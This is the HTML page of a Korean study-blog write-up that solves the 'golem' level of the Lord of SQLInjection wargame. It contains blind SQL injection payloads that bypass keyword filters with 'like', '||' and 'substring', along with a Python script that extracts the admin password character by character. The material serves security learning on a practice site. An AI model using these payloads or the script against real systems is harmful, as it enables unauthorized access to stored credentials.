@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<meta name="google-site-verification" content="bzX7XUWe3ykyp7JEIMERPXEKJydMTMDTX9Db5xyPdxA" />
+
+<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"koun9hwan.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Lord of SQLInjection] [1번_golem] Write UP">
+<meta property="og:url" content="https://koun9hwan.github.io/2021/10/21/2021-10-21-Lord_of_SQLInjection_11_golem/index.html">
+<meta property="og:site_name" content="Koun9Hwan">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/golem/source.png">
+<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/golem/solve_1.png">
+<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/golem/solve_2.png">
+<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/golem/solve_3.png">
+<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/golem/solve_4.png">
+<meta property="article:published_time" content="2021-10-21T12:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-21T12:30:09.328Z">
+<meta property="article:author" content="KoungHwan">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Write UP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/golem/source.png">
+
+
+<link rel="canonical" href="https://koun9hwan.github.io/2021/10/21/2021-10-21-Lord_of_SQLInjection_11_golem/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://koun9hwan.github.io/2021/10/21/2021-10-21-Lord_of_SQLInjection_11_golem/","path":"2021/10/21/2021-10-21-Lord_of_SQLInjection_11_golem/","title":"[Lord of SQLInjection] [1번_golem] Write UP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Lord of SQLInjection] [1번_golem] Write UP | Koun9Hwan</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Koun9Hwan</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Study Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%A8-%EC%A0%84%EC%B2%B4-%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C"><span class="nav-text">🎨 전체 소스코드</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%94%94-%EC%A4%91%EC%9A%94-%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C-%ED%95%B4%EC%84%9D"><span class="nav-text">🔔 중요 소스코드 해석</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%EC%A4%84-2-%EC%A4%84-%ED%95%B4%EC%84%9D"><span class="nav-text">1 줄 ~ 2 줄 해석</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%EC%A4%84-%ED%95%B4%EC%84%9D"><span class="nav-text">4 줄 해석</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%EC%A4%84-7-%EC%A4%84-%ED%95%B4%EC%84%9D"><span class="nav-text">5 줄 ~ 7 줄 해석</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%99%86%E2%80%8D%E2%99%80%EF%B8%8F-SOLVE"><span class="nav-text">🙆‍♀️ SOLVE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%BD%94%EB%93%9C"><span class="nav-text">파이썬 코드</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">KoungHwan</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/koun9hwan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;koun9hwan" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+          </div>
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://koun9hwan.github.io/2021/10/21/2021-10-21-Lord_of_SQLInjection_11_golem/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="KoungHwan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Koun9Hwan">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Lord of SQLInjection] [1번_golem] Write UP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-10-21 21:00:00 / Modified: 21:30:09" itemprop="dateCreated datePublished" datetime="2021-10-21T21:00:00+09:00">2021-10-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Lord-of-SQLInjection/" itemprop="url" rel="index"><span itemprop="name">Lord of SQLInjection</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description"> </div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>
+
+<p>11번 문제인 golem를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/golem/source.png">
+
+<br>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_golem where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;golem&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;golem&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><code>조건문</code>과 <code>query문</code>, <code>addslashes 함수</code>, <code>pw</code> 변수 값과 <code>GET으로 받아온 pw 파라미터 값</code>이 같아야 한다는 <code>조건문</code>이 있습니다.</p>
+<br>
+
+<br>
+
+<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and|substr\(|=/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><code>preg_match</code>라는 함수가 있습니다.</p>
+<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
+<p><code>prob</code>, <code>or</code>, <code>and</code>, <code>substr</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> <code>=</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
+<br>
+
+<br>
+
+<h2 id="4-줄-해석"><a href="#4-줄-해석" class="headerlink" title="4 줄 해석"></a>4 줄 해석</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>
+
+<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<h2 id="5-줄-7-줄-해석"><a href="#5-줄-7-줄-해석" class="headerlink" title="5 줄 ~ 7 줄 해석"></a>5 줄 ~ 7 줄 해석</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_golem where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;golem&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시키고 <code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>
+
+<img src="/images/Lord of SQLInjection/golem/solve_1.png">
+
+<br>
+
+<p><code>pw</code> 파라미터를 참으로 만들어주니 Hello admin이 출력되었습니다.</p>
+<p><code>=</code> 특수문자는 <code>like</code>로 우회가 가능합니다.</p>
+<br>
+
+<br>
+
+<p><code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
+<br>
+
+<p><code>?pw=1&#39; || id like &#39;admin&#39; %26%26 length(pw) like &#39;1</code><br>MySQL의 <code>length</code> 함수를 사용하여 길이를 구해줍니다.</p>
+<br>
+
+<p><code>?pw=1&#39; || id like &#39;admin&#39; %26%26 substring(pw,1,1) like &#39;0</code><br>MySQL의 <code>substring</code> 함수를 사용하여 <code>substr</code>필터링을 우회 하고 <code>pw</code>를 하나 씩 추출하여 참인지 확인해야 합니다.</p>
+<br>
+
+<blockquote>
+<p><code>substring(str, pos, len)</code> 함수의 인자를 설명하겠습니다.</p>
+<p><code>str</code> : 원본 문자열</p>
+<p><code>pos</code> : 시작 위치 값</p>
+<p><code>len</code> : 가져올 길이 값</p>
+</blockquote>
+<br>
+
+<p>예를 들어 <code>substring(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
+<br>
+
+<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 소요됩니다.</p>
+<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
+<br>
+
+<br>
+
+<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1&#x27; || id like &#x27;admin&#x27; %26%26 &quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;length(pw) like &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;substring(pw,&#123;&#125;,1) like &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            pwd = pwd + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>url을 적어 줍니다. <code>?pw=1&#39; || id like &#39;admin&#39; %26%26 </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
+<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
+<br>
+
+<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
+<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올때까지 <code>length</code>값을 1씩 더해줍니다.</p>
+<br>
+
+<p><code>substring</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
+<p><code>i</code>는 <code>1 ~ length+1</code> 까지 돌아갑니다.</p>
+<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/golem/solve_2.png">
+
+<br>
+
+<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
+<br>
+
+<br>
+
+<img src="/images/Lord of SQLInjection/golem/solve_3.png">
+
+<br>
+
+<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
+<br>
+
+<br>
+
+<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
+<img src="/images/Lord of SQLInjection/golem/solve_4.png">
+
+<br>
+
+<br>
+
+<blockquote>
+<p>SOLVED !!!</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Write-UP/" rel="tag"># Write UP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/04/2021-10-04-Lord_of_SQLInjection_10_skeleton/" rel="prev" title="[Lord of SQLInjection] [10번_skeleton] Write UP">
+                  <i class="fa fa-chevron-left"></i> [Lord of SQLInjection] [10번_skeleton] Write UP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">KoungHwan</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":"forest","js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@8.12.0/dist/mermaid.min.js","integrity":"sha256-0dD7vUjUCTGJjeLnPotQQJIcSzug5fO6WDMYYyNIX4c="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
